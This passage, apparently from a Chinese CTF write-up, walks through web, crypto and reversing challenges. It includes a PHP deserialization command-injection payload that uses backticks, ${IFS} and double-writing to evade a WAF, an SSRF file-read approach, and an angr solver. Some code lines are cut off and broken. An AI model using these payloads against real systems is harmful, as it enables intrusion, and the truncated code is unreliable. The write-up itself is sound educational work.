            print c+flag
            choice2(a)
            choice2(c+flag)
            if choice1() == flag_enc:
                flag=c+flag
                print "success:",flag
                break
爆破到最后一个字节崩了。。。 应该是去掉了所有的 flag ，不过可以猜出来 flag
> flag{H4ve_fun_w1th_p4d_and_unp4d}
### Web
#### what are you doing?
提示看 robots.txt，发现了 source.php 和 flag.php。
访闻 source.php ，提示管理员登录，改包利用 x-client-ip 进行绕过，提示要 post admin 和 url 参数。
url 放进去网址后，得到一个路径，访问应该是源码。
猜想是 SSRF ，利用 file 协议读取 flag:
访问得到 flag。
#### Can you hack me?
存在源码泄露，index.php.swp,用 vim 还原：
    method = $method;
            $this->args = $args;
        }
        function __wakeup(){
            foreach($this->args as $k => $v) {
                $this->args[$k] = $this->waf(trim($v));
            }
        }
        function waf($str){
            $str=preg_replace("/[<>*;|?\n ]/","",$str);
            $str=str_replace('flag','',$str);
            return $str;
        }           
        function echo($host){
            system("echo $host");
        }
        function __destruct(){
            if (in_array($this->method, array("echo"))) {
                call_user_func_array(array($this, $this->method), $this->args);
            }
        } 
    }
    $first='hi';
    $var='var';
    $bbb='bbb';
    $ccc='ccc';
    $i=1;
    foreach($_GET as $key => $value) {
            if($i===1)
            {
                $i++;
                $$key = $value;
            }
            else{break;}
    }
    if($first==="doller")
    {
        @parse_str($_GET['a']);
    if($var==='give'){
        if($bbb==='me'){
            if($ccc==='flag'){
                echo "welcome";
                $come=@$_POST['come'];
                unserialize($come);
            }
        }
        else{
            echo "think about it";
        }
    }
    else{
        echo "no";
    }
    }
    else{
        echo "can you hack me?";
    }
    ?>
明显的反序列化，回调函数调用 echo 函数的 system，存在 waf，flag过滤用双写绕过，反引号没有过滤
payload：
    come=O:4:"come":2:{s:12:"%00come%00method";s:4:"echo";s:10:"%00come%00args";a:1:{s:4:"host";s:30:"`nl${IFS}../../../../flaflagg`";}}
#### GOOD JOB
    >2|(((num1[i]^i) flag{a197b847-7092-53a4-7c41-bc7d6d52e69d}
#### Cyvm
虚拟机逆向，直接 Angr 跑。
    import angr
    import claripy
    p = angr.Project('cyvm')
    flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(32)]
    flag = claripy.Concat(*flag_chars + [claripy.BVV(b'\n')])
    st = p.factory.blank_state(addr=0x400CB1,stdin=flag)
    for k in flag_chars:
        st.solver.add(k >= 32)
        st.solver.add(k  flag{7h15_15_MY_f1rs7_s1mpl3_Vm}
### 总结
Web 感觉有些脑洞的东西，Crypto 的题都要写脚本，socket 感觉有点难用，要转 pwntools 了....
做出 Misc 的都是带哥。